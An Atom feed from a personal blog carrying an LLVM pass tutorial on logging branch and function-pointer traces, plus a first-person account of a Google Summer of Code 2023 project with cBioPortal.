<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gloria&#39;s Notebook</title>
  
  
  <link href="https://beking0912.github.io/atom.xml" rel="self"/>
  
  <link href="https://beking0912.github.io/"/>
  <updated>2024-01-06T00:05:22.752Z</updated>
  <id>https://beking0912.github.io/</id>
  
  <author>
    <name>Gloria Su</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>üå≤ LLVM Pass Development I: Branch-Pointer Trace</title>
    <link href="https://beking0912.github.io/2023/12/12/llvm/"/>
    <id>https://beking0912.github.io/2023/12/12/llvm/</id>
    <published>2023-12-13T01:58:17.000Z</published>
    <updated>2024-01-06T00:05:22.752Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2024/01/06/JA6sz4WtqvEkpd3.png" alt="Frame 2 _3_.png"><br>In the world of making computer programs run faster, it‚Äôs crucial to really understand how a program behaves while it‚Äôs running. Traditional methods mostly look at the code itself, trying to estimate how it will perform. However, this approach often misses the important influence of different inputs on how a program acts when it‚Äôs actually running.</p><p>The Key Points Detection project steps in to fill this gap by introducing a profiling tool. This tool is like a detective during the program‚Äôs execution, carefully keeping track of important events, especially focusing on decision points and function choices. This project is a big step forward in truly grasping how programs behave, which is crucial for making smart improvements to the code.</p><h2 id="Key-Points-Detection"><a href="#Key-Points-Detection" class="headerlink" title="Key Points Detection"></a>Key Points Detection</h2><p>Let‚Äôs dive into a C program (let‚Äôs call it ‚ÄúfileX‚Äù) to see how Key Points Detection works in capturing branch and function pointer traces. The program has a function pointer and a loop, which can lead to different behaviors.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Line <span class="number">1</span>: <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">Line <span class="number">2</span>:     <span class="type">void</span> (*fun_ptr)(<span class="type">int</span>) = &amp;fun;</span><br><span class="line">Line <span class="number">3</span>:     <span class="type">int</span> c = (*fun_ptr)(<span class="number">10</span>);</span><br><span class="line">Line <span class="number">4</span>:     </span><br><span class="line">Line <span class="number">5</span>:     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">Line <span class="number">6</span>:          c = c + <span class="number">1</span>;</span><br><span class="line">Line <span class="number">7</span>:     &#125;</span><br><span class="line">Line <span class="number">8</span>:     <span class="keyword">return</span> c;</span><br><span class="line">Line <span class="number">9</span>: &#125;</span><br></pre></td></tr></table></figure><p>The expected trace shows the occurrences of branches and function pointer values during the program‚Äôs execution. It looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*func_0x32576867</span><br><span class="line">br_2</span><br><span class="line">br_2</span><br><span class="line">br_2</span><br><span class="line">br_3</span><br></pre></td></tr></table></figure><p>In this trace, ‚Äú*func_0x32576867‚Äù represents a function pointer value, and ‚Äúbr_x‚Äù represents branch IDs. These serve as a detailed record of what‚Äôs happening in the program.<br>For example, the tool‚Äôs dictionary file could explain branch IDs like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">br_2: fileX, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">br_3: fileX, <span class="number">5</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure><p>Breaking it down, ‚Äúbr_2‚Äù indicates a branch in ‚ÄúfileX‚Äù starting at line 5 and going to line 6. Similarly, ‚Äúbr_3‚Äù is another branch in ‚ÄúfileX,‚Äù starting from line 5 and reaching line 8. The line numbers tell you where the branch starts, and the target line number shows where it ends.</p><p>In the provided code example, within the loop structure (lines 5-7), two branches are encountered due to the iterative nature of the loop. The trace appropriately captures these branches (br_2) multiple times, reflecting the dynamic execution of the program during each iteration of the loop.</p><h2 id="Before-Implementation"><a href="#Before-Implementation" class="headerlink" title="Before Implementation"></a>Before Implementation</h2><p>Learn LLVM here: <a href="https://llvm.org/"><strong>LLVM</strong></a></p><p>LLVM (Low-Level Virtual Machine) is a widely used compiler infrastructure project that provides a collection of modular and reusable compiler and toolchain technologies. LLVM IR (Intermediate Representation) serves as an essential intermediate step during the compilation process. Profiling program behavior, particularly counting branch executions, is crucial for understanding control flow decisions. </p><ul><li><p>ID Generation:</p><ul><li>A unique branch ID is crafted by combining the opcode name and branch number.</li><li>This ID serves as a distinct label for each encountered branch.</li></ul></li><li><p>Dictionary Update and Counter Increment:</p><ul><li>The branch dictionary is updated with branch details, including file name, start line, and target line.</li><li>The branch counter is incremented for generating a unique identifier for subsequent branches.</li></ul></li><li><p>IR Instrumentation for Logging:</p><ul><li>Instrumentation code is inserted into the LLVM IR to call a logging function with the branch ID.</li><li>The logging function captures and records information about branch executions.</li></ul></li></ul><h2 id="Challenges-amp-Solutions"><a href="#Challenges-amp-Solutions" class="headerlink" title="Challenges &amp; Solutions"></a>Challenges &amp; Solutions</h2><p><strong>Challenge:</strong><br>LLVM, as a static analysis tool, does not inherently execute code during analysis. Consequently, it cannot directly count how many times a branch is taken during program execution. </p><p><strong>Solution:</strong><br>To address this challenge, the profiling tool must insert instrumentation into the LLVM IR to increment counters each time a branch is executed.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IRBuilder&lt;&gt; builder (&amp;*branch-&gt;getFirstInsertionPt ());</span><br><span class="line">Value* args [] = &#123;builder.CreateGlobalStringPtr (branchID)&#125;;</span><br><span class="line">builder.CreateCall (logFunc, args);</span><br></pre></td></tr></table></figure><p><strong>Challenge:</strong><br>Printing branch IDs during Intermediate Representation (IR) analysis poses a significant challenge as LLVM primarily focuses on static analysis and does not inherently support direct printing functionalities during this phase.</p><p><strong>Solution:</strong><br>To address the challenge of printing branch IDs within the LLVM IR, a well-defined solution involves the incorporation of a custom logging function. The solution code defines a logPrint function that takes a string as input and prints it. This function is then declared and instantiated within the LLVM context, creating a bridge between the static analysis process and the ability to generate runtime-like outputs.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">LLVMContext &amp;Ctx = F.getContext();</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Type *&gt; paramTypes = &#123;Type::getInt8PtrTy(Ctx)&#125;;</span><br><span class="line">Type *retType = Type::getVoidTy(Ctx);</span><br><span class="line">FunctionType *logFuncType = FunctionType::get(retType, paramTypes, <span class="literal">false</span>);</span><br><span class="line">FunctionCallee logFunc = F.getParent()-&gt;getOrInsertFunction(<span class="string">&quot;logPrint&quot;</span>, logFuncType);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">builder.CreateCall(logFunc, args);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h2 id="Code-Walkthrough"><a href="#Code-Walkthrough" class="headerlink" title="Code Walkthrough"></a>Code Walkthrough</h2><p>Check out my code in <a href="https://github.com/Beking0912/llvm-pass-skeleton"><strong>github</strong></a>.</p><p>Let‚Äôs break down the key points in the LLVM Pass code for branch execution counting, emphasizing the understanding of the critical code blocks:</p><h3 id="Dictionary-and-Counter-Initialization"><a href="#Dictionary-and-Counter-Initialization" class="headerlink" title="Dictionary and Counter Initialization"></a>Dictionary and Counter Initialization</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="built_in">std</span>::tuple&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="type">int</span>, <span class="type">int</span>&gt;&gt; branchDictionary;</span><br><span class="line"><span class="type">int</span> branchNumber = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li><code>branchDictionary</code>: A data structure to store information about each branch, identified by a unique branch ID. It holds details like the source file name, starting line, and target line.</li><li><code>branchNumber</code>: An integer counter initialized to zero, responsible for assigning unique IDs to each encountered branch.</li></ul><h3 id="Function-and-Logging-Setup"><a href="#Function-and-Logging-Setup" class="headerlink" title="Function and Logging Setup"></a>Function and Logging Setup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Function &amp;F : M.functions ()) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  FunctionType *logFuncType = FunctionType::get(retType, paramTypes, <span class="literal">false</span>);</span><br><span class="line">  FunctionCallee logFunc = F.getParent()-&gt;getOrInsertFunction(<span class="string">&quot;logPrint&quot;</span>, logFuncType);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>The LLVM Pass iterates over each function in the module.</li><li>It sets up a logging function (<code>logPrint</code>) with the appropriate function type, preparing to log information about executed branches.</li></ul><h3 id="Branch-Instrumentation"><a href="#Branch-Instrumentation" class="headerlink" title="Branch Instrumentation"></a>Branch Instrumentation</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (BasicBlock &amp;B : F) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span> (Instruction &amp;I : B) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> *BI = dyn_cast&lt;BranchInst&gt;(&amp;I)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (BI-&gt;isConditional()) &#123;</span><br><span class="line">        <span class="type">const</span> DebugLoc &amp;Loc = BI-&gt;getDebugLoc();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Nested loops traverse basic blocks and instructions within functions.</li><li>Conditional branch instructions (<code>BranchInst</code>) are identified for instrumentation.</li><li>Debug location information is extracted to identify the source code location of the branch.</li></ul><h3 id="ID-Generation-and-Logging"><a href="#ID-Generation-and-Logging" class="headerlink" title="ID Generation and Logging"></a>ID Generation and Logging</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> branchID = opcodeName + <span class="string">&quot;_&quot;</span> + <span class="built_in">std</span>::to_string(branchNumber);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">IRBuilder&lt;&gt; builder (&amp;*branch-&gt;getFirstInsertionPt ());</span><br><span class="line">Value* args[] = &#123;builder.CreateGlobalStringPtr(branchID)&#125;;</span><br><span class="line">builder.CreateCall(logFunc, args);</span><br><span class="line">branchNumber += <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>A unique branch ID is generated by combining the opcode name and the branch number.</li><li>The branchDictionary is then updated with information related to the current branch. This includes the source file name, starting line, and target line. Simultaneously, the <code>branchNumber</code> is incremented, ensuring the generation of a distinct identifier for the next encountered branch.</li><li>The LLVM IR is dynamically modified to insert instrumentation code. Using the IRBuilder, a call to the logging function (<code>logFunc</code>) is added at the beginning of the basic block containing the branch instruction. This call includes the branch ID as a parameter, facilitating the logging of branch-related information.</li></ul><h2 id="Input-amp-Output"><a href="#Input-amp-Output" class="headerlink" title="Input &amp; Output"></a>Input &amp; Output</h2><p><strong>Input:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value of a is %d\n&quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">void</span> (*fun_ptr)(<span class="type">int</span>) = &amp;fun;</span><br><span class="line">  (*fun_ptr)(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> b;</span><br><span class="line">  <span class="keyword">for</span> (c = <span class="number">0</span>; c &lt; <span class="number">3</span>; c++) &#123;</span><br><span class="line">    b = c + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Output:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">main: func_0x147e4af98</span><br><span class="line">Branch Dictionary:</span><br><span class="line">br_0: fileX.c, 14, 15</span><br><span class="line">br_1: fileX.c, 14, 18</span><br><span class="line"></span><br><span class="line">Value of a is 10</span><br><span class="line">br_0</span><br><span class="line">br_0</span><br><span class="line">br_0</span><br><span class="line">br_1</span><br></pre></td></tr></table></figure><h2 id="Compile-amp-Run"><a href="#Compile-amp-Run" class="headerlink" title="Compile &amp; Run"></a>Compile &amp; Run</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1: Create and navigate to the build directory</span></span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Run CMake and make with Debug flags</span></span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Debug ..</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Navigate back to the parent directory</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Compile logPrint.c with debug information and no optimization</span></span><br><span class="line">cc -g -O0 -c logPrint.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Compile fileX.c with the clang plugin, including debug information and no optimization</span></span><br><span class="line">clang -fno-discard-value-names -fpass-plugin=<span class="string">&#x27;build/skeleton/SkeletonPass.dylib&#x27;</span> -c test2.c -g -O0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 6: Link the object files and create the executable with debug information</span></span><br><span class="line">cc -g test2.o logPrint.o -o a.out</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 7: Run the executable</span></span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>By successfully capturing and recording critical runtime factors including conditional branching points and function pointer calls, our profiling tool provides valuable insights into program executions. The generated Branch-Pointer Trace and associated dictionary offer a comprehensive overview of control flow dynamics, laying the groundwork for in-depth program analysis.</p><p>Looking ahead, the next phase of this project involves the implementation of a static analysis tool. This tool will build upon the existing codebase, aiming to automatically identify the inputs to a C program that specifically determine its behavior at key points. Focusing on conditional branching and function pointer calls, our goal is to streamline the identification process, facilitating a more automated and efficient understanding of program behaviors. </p><p><img src="https://s2.loli.net/2024/01/06/shgorHTIQfRYJW3.png" alt="Frame 1 _3_.png"></p><hr><p>References:</p><ul><li><a href="https://www.cs.cornell.edu/%7Easampson/blog/llvm.html">LLVM for Grad Students</a></li></ul><p>üîç Check out my code in <a href="https://github.com/Beking0912/llvm-pass-skeleton"><strong>github</strong></a>.<br>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#x73;&#117;&#x35;&#64;&#x6e;&#x63;&#x73;&#117;&#x2e;&#x65;&#x64;&#x75;">&#98;&#x73;&#117;&#x35;&#64;&#x6e;&#x63;&#x73;&#117;&#x2e;&#x65;&#x64;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2024/01/06/JA6sz4WtqvEkpd3.png&quot; alt=&quot;Frame 2 _3_.png&quot;&gt;&lt;br&gt;In the world of making computer programs run fast</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="LLVM" scheme="https://beking0912.github.io/tags/LLVM/"/>
    
    <category term="Complier Construction" scheme="https://beking0912.github.io/tags/Complier-Construction/"/>
    
    <category term="C++" scheme="https://beking0912.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>üåû Google Summer of Code: My Journey &amp; Guide</title>
    <link href="https://beking0912.github.io/2023/09/04/Google-Summer-of-Code/"/>
    <id>https://beking0912.github.io/2023/09/04/Google-Summer-of-Code/</id>
    <published>2023-09-04T18:17:01.000Z</published>
    <updated>2023-09-04T18:17:38.296Z</updated>
    
    <content type="html"><![CDATA[<p>In my previous blog, I delved into the technical intricacies of the feature I developed during Google Summer of Code - <a href="https://beking0912.github.io/2023/08/21/Open-Source-Journey-Guide-My-GSoC-2023/"><strong>Interactive Web Tour</strong></a>. In this blog, I‚Äôll be shifting gears, focusing on sharing my firsthand experiences, offering valuable suggestions, and addressing some frequently asked questions. </p><p>Join me as I provide insights to enrich your Open-Source journey!</p><p><img src="https://s2.loli.net/2023/09/05/NKTGf3QWkIr4c89.png" alt="2023-09-04 14.07.40.png"></p><h2 id="Discovering-GSoC"><a href="#Discovering-GSoC" class="headerlink" title="Discovering GSoC"></a>Discovering GSoC</h2><p>I first learned about Google Summer of Code (GSoC) while browsing a forum for international students. I came across a post recommending open-source projects, which introduced Google Summer of Code, Outreachy, Linux Foundation Mentorship Program, and MLH Fellowship. Upon diving deeper into these opportunities, I made the choice to participate in this year‚Äôs Google Summer of Code.</p><h2 id="Project-Selection-3-20-4-04"><a href="#Project-Selection-3-20-4-04" class="headerlink" title="Project Selection 3.20-4.04"></a>Project Selection 3.20-4.04</h2><p>On March 20th, the GSoC contributor application period began, and I started selecting the project I wanted to work on. My main criteria were how interesting the project was and how well it matched my technical skills. Initially, I narrowed down to 28 projects from 18 organizations. After carefully reading project descriptions and requirements, I took a deep breath: I had missed some code challenges, certain projects needed prior bug fixes and PR submissions, and some already had numerous self-recommendations and seemingly solid implementation proposals. It seemed that my ‚Äòefforts‚Äô were a bit late.</p><p>However, I didn‚Äôt want to give up easily. I adjusted my approach. If I lacked competitiveness in those popular projects, I‚Äôd shift my focus to find projects that aligned with my skills yet weren‚Äôt as heavily contested. Meanwhile, I was immersed in my spring semester studies at school, leaving me limited time to craft proposals for multiple projects. So, I refined my selection once again. </p><p>Finally, I found my best fit: <a href="https://summerofcode.withgoogle.com/programs/2023/organizations/cbioportal-for-cancer-genomics"><strong>cBioPortal for Cancer Genomics</strong></a>.</p><p>I found two projects in cBioPortal that best suited my skills:<br>1.<a href="https://github.com/cBioPortal/GSoC/issues/95">Annotate Cancer Alterations and Generate Patient Report</a>,<br>2.<a href="https://github.com/cBioPortal/GSoC/issues/86">Interactive Web Tour</a>.<br>Then I greeted the community in the github discussion to express my interest.</p><p><img src="https://s2.loli.net/2023/08/25/YyMExefg95vPaUk.png" alt="2023-08-24 21.03.43.png"><br><img src="https://s2.loli.net/2023/08/25/FumhZnqXN1VGSDI.png" alt="2023-08-24 18.16.13.png"></p><h2 id="Finding-the-Right-Fit"><a href="#Finding-the-Right-Fit" class="headerlink" title="Finding the Right Fit"></a>Finding the Right Fit</h2><p>The most direct way to enhance competitiveness is to ‚Äòshow me the code.‚Äô So, I allocated two days for each project to explore solutions and create demos. The thoughts during my exploration and the final outcomes could serve as the basis for my proposals.</p><p>While working on the first project, I hit a roadblock right at the beginning ‚Äì I couldn‚Äôt even get the project running! I diligently followed the readme instructions step by step, but I ended up encountering perplexing errors that seemed unsolvable. (Here, my advice is to never hesitate to seek help from the community. This is my regret, but it also led me to my current project.)</p><p>I then shifted to the second project, which was closely aligned with my strong suit. I had prior experience developing user guidance features, so I felt confident. Indeed, the process from installation to setup went incredibly smoothly. I got the project up and running with minimal effort, a positive sign! Following the project‚Äôs guidance, I browsed through code demos left by predecessor. I found the web tour intriguing and began sketching out a preliminary implementation plan, and created a basic version of the web tour.</p><p>I believe the Interactive Web Tour project is my destined choice.</p><h2 id="Crafting-the-Proposal"><a href="#Crafting-the-Proposal" class="headerlink" title="Crafting the Proposal"></a>Crafting the Proposal</h2><p>The next step is to write the proposal.<br>I‚Äôm including the challenges I anticipated during the brainstorming and demo-writing process, like choosing the right technologies, structuring content for each step, utilizing localStorage for cross-page continuity, and developing interactive web tour logic. I‚Äôve also submitted a <a href="https://github.com/cBioPortal/cbioportal-frontend/pull/4569"><strong>draft PR</strong></a> with a GIF to effectively showcase my work. Sincere effort is always the most convincing.</p><p>About the project:</p><ul><li>Objective</li><li>Specific Steps</li><li>Anticipated Challenges and My Thoughts</li><li>Tasks and Implementation Plan</li></ul><p>About the myself:</p><ul><li>Personal Background</li><li>Relevant Skills</li><li>Code Demo</li><li>My Availability</li></ul><h2 id="Proposal-Accepted-5-04"><a href="#Proposal-Accepted-5-04" class="headerlink" title="Proposal Accepted 5.04"></a>Proposal Accepted 5.04</h2><p>My proposal got accepted!<br>This year‚Äôs GSoC had a total of 43,765 applicants from 160 countries, and I feel fortunate to be among the 967 GSoC contributors who got accepted. All my efforts have paid off!<br><img src="https://s2.loli.net/2023/08/25/VXoSDTOJpE9FUug.png" alt="2023-08-24 21.38.09.png"></p><h2 id="Visa-Concerns"><a href="#Visa-Concerns" class="headerlink" title="Visa Concerns"></a>Visa Concerns</h2><p>Amidst my joy, as an international student on an F1 visa, I couldn‚Äôt help but worry about my eligibility for GSoC. I emailed the Office of International Services (OIS) to inquire, but their response was disheartening: ‚ÄòUnfortunately, Google Summer of Code is not eligible for CPT, nor can you complete any other work on your CPT authorization that was not part of the position you used to apply for CPT. Many students have expressed interest in the Summer of Code, and unfortunately there‚Äôs no way for an F-1 student to complete it unless they do it outside of the US.‚Äô</p><p>My world nearly crumbled, until I shared this situation with one of my mentors. At that moment, I want to say: you‚Äôre my hero! Mentor Ryan helped me gather the necessary materials, and I successfully applied for CPT! I can now legally participate in GSoC in the US!</p><p><img src="https://s2.loli.net/2023/08/25/89Jplrkcwm631UP.jpg" alt="WechatIMG614.jpeg"></p><h2 id="Connect-with-Community"><a href="#Connect-with-Community" class="headerlink" title="Connect with Community"></a>Connect with Community</h2><p>Before GSoC officially began, my mentors invited me to meetings for introductions, Laptop Setup, Repo Review, and more. The cBioPortal community also organized an online meeting for all GSoC participants. Everything went smoothly.</p><p><img src="https://s2.loli.net/2023/08/25/xXCWjITK2NvuLHt.jpg" alt="hoga 2023-08-24 230919.896.jpg"></p><p>Moving on to the main part.<br>My mentors and I established a weekly meeting routine, covering topics like: </p><ol><li>Progress from the previous week, </li><li>Plans for the upcoming week, </li><li>Q&amp;A, Troubleshooting,</li><li>Suggestions and improvements, and more.</li></ol><p>Although my spoken English and listening skills aren‚Äôt perfect, my mentors are incredibly nice; they speak slowly, consider my comfort, and encourage me to immerse myself in the English environment for improvement. Additionally, we communicate on Slack, where I proactively share my progress and seek assistance. Mentors respond promptly and offer helpful guidance. Gradually, I‚Äôve adapted to this work environment.<br>I omitted the project‚Äôs specific details here, but you can find them in <a href="https://beking0912.github.io/2023/08/21/Open-Source-Journey-Guide-My-GSoC-2023/">this blog post</a>.</p><h2 id="Midterm-Evaluation-7-14"><a href="#Midterm-Evaluation-7-14" class="headerlink" title="Midterm Evaluation 7.14"></a>Midterm Evaluation 7.14</h2><p>During the midterm presentation, I showcased the web tour I developed to the product and engineering teams, and explained how to add a new tour based on the current codebase (a fantastic suggestion from mentor Jeremy). And I actively sought feedback, meticulously incorporating it into iterative improvements that further enhanced the functionality and user experience.</p><p><img src="https://s2.loli.net/2023/08/25/WrRLGwxa6mHMDgf.png" alt="2023-08-24 23.06.04.png"></p><h2 id="Final-Evaluation-9-4"><a href="#Final-Evaluation-9-4" class="headerlink" title="Final Evaluation 9.4"></a>Final Evaluation 9.4</h2><p>After wrapping up coding and testing, I submitted a PR for experienced engineers to conduct a comprehensive code review. This led to an online preview, giving the product team an opportunity to provide optimization suggestions. Witnessing the feature I developed available for online preview was truly fulfilling, and I‚Äôm excited about the possibility of seeing it go live!</p><p><img src="https://s2.loli.net/2023/09/05/fV1abPhurwzIOWM.png" alt="2023-09-04 14.09.42.png"></p><h2 id="Summing-Up"><a href="#Summing-Up" class="headerlink" title="Summing Up"></a>Summing Up</h2><p><strong>Most important accomplishments:</strong></p><ul><li>Proposed and created an interactive web tour to facilitate the exploration of less prominent features including virtual study and group comparison, promoting efficient utilization of cancer genomics data.</li><li>Completed the end-to-end tests to verify the entire web tour from start to finish.</li><li>Delivered a detailed documentation for detailed steps of each tour, test procedures, and instructions on adding new tours.</li></ul><p><strong>Most significant challenges:</strong></p><ul><li>Achieved seamless transitions for web tour steps across multiple pages.</li><li>Completed end-to-end testing code to cover all functionalities I have developed.</li></ul><p><strong>Skills developed:</strong></p><ul><li>I have learned a new skill, end-to-end testing.</li><li><strong>Don‚Äôt be afraid to ask for help!</strong> Follow the ‚Äú15-minute rule‚Äù, if you don‚Äôt have an answer after 15 minutes, you should ask for help.</li></ul><p>The most satisfying aspect was successfully completing the feature development and making a meaningful contribution to the open-source community. The collaborative atmosphere within the team has been equally beneficial - my colleagues have been ready to lend a helping hand and offer optimization suggestions, enriching my technical skills and contributing to my professional growth!</p><p><img src="https://s2.loli.net/2023/09/05/TJLKhZx87IODWsV.png" alt="2023-09-04 14.15.06.png"></p><h2 id="Thanks-All"><a href="#Thanks-All" class="headerlink" title="Thanks All!!!"></a>Thanks All!!!</h2><p>Excellent mentoring, <a href="https://github.com/JREastonMarks">Jeremy</a> and <a href="https://github.com/fuzhaoyuan">Ryan</a>! üëèüëèüëè<br>Your guidance was invaluable throughout the GSoC journey. Your timely feedback and insightful suggestions greatly enhanced my learning and project outcomes. Thanks both for your outstanding support! üëèüëèüëè</p><p>Extend my gratitude to the product team, for their thorough product reviews. üëèüëèüëè<br>Special thanks to <a href="https://github.com/inodb">Ino</a> and <a href="https://github.com/alisman">Aaron</a> for their valuable code reviews. üëèüëèüëè<br>I appreciate <a href="https://github.com/inodb">Ino</a> and <a href="https://github.com/dippindots">Gaofei</a> for patiently addressing my numerous questions. üëèüëèüëè<br>And heartfelt thanks to many others who contributed to my success! üëèüëèüëè<br><br/></p><hr><p>üìÆ Feel free to hit me up about Google Summer of Code experience: <a href="https://www.linkedin.com/in/beking-0912/">Linkedin</a>.<br>üòÑ Let‚Äôs contribute to Open Source!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In my previous blog, I delved into the technical intricacies of the feature I developed during Google Summer of Code - &lt;a href=&quot;https://b</summary>
      
    
    
    
    <category term="Open Source" scheme="https://beking0912.github.io/categories/Open-Source/"/>
    
    
  </entry>
  
  <entry>
    <title>üåû GSoC 2023: Interactive Web Tour</title>
    <link href="https://beking0912.github.io/2023/08/21/Open-Source-Journey-Guide-My-GSoC-2023/"/>
    <id>https://beking0912.github.io/2023/08/21/Open-Source-Journey-Guide-My-GSoC-2023/</id>
    <published>2023-08-21T23:38:08.000Z</published>
    <updated>2023-09-12T21:23:57.777Z</updated>
    
